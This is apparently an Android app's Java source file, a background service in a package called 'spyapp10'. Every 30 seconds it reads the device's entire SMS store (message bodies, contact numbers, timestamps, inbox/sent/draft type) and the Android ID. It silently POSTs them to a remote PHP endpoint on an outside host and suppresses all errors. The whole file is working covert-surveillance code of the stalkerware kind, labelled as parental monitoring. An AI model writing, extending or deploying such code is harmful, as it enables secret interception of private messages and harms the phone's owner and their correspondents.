package com.example.vipul.spyapp10;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class messageService extends Service {
    public messageService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        final Thread runnable = new Thread() {
            @Override
            public void run() {
                while (true) {
                    try {
                        messageLog();
                        sleep(30000);
                    } catch (Exception e) {
                        Log.e("errorinService1", e.toString());
                    }
                }
            }
        };
        runnable.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    public void messageLog(){
        String a=null,b=null,c=null,d= null;
        String body="",number="",date="",typeOfSMS="",time="";
        try{
            Uri uri = Uri.parse("content://sms");
            Cursor cursor1 = getContentResolver().query(uri, null, null, null, null);
            cursor1.moveToFirst();
            while(!cursor1.isLast()) {
                try {
                    a = cursor1.getString(cursor1.getColumnIndex("body")).toString();
                    b = cursor1.getString(cursor1.getColumnIndex("address")).toString();
                    date = cursor1.getString(cursor1.getColumnIndex("date")).toString();
                    Date callDayTime = new Date(Long.valueOf(date));
                    c = "DAY-" + new SimpleDateFormat("yyyy-MM-dd").format(callDayTime) + "   TIME-" +
                            new SimpleDateFormat("HH:mm").format(callDayTime) + "||";
                    String type = cursor1.getString(cursor1.getColumnIndex("type")).toString();
                    switch (Integer.parseInt(type)) {
                        case 1:
                            d = "INBOX";
                            break;
                        case 2:
                            d = "SENT";
                            break;
                        case 3:
                            d = "DRAFT";
                            break;
                    }
                }catch (Exception e){
                }
                finally {
                    cursor1.moveToNext();
                }
                body+=a+"||";
                number+=b+"||";
                time+=c+"||";
                typeOfSMS+=d+"||";
            }

            String DeviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID) ;
            String Email=MainActivity.EMAIL;
            new UpdateUserDetailMESSAGE().execute(Email, DeviceId, body, number, time, typeOfSMS);
            cursor1.close();
        }catch (Exception f){
        }
    }
    private class UpdateUserDetailMESSAGE extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/smsdet.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(6);
                nameValuePair.add(new BasicNameValuePair("email", params[0]));
                nameValuePair.add(new BasicNameValuePair("did", params[1]));
                nameValuePair.add(new BasicNameValuePair("msg", params[2]));
                nameValuePair.add(new BasicNameValuePair("phone", params[3]));
                nameValuePair.add(new BasicNameValuePair("time", params[4]));
                nameValuePair.add(new BasicNameValuePair("type", params[5]));

                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
        }
    }
}
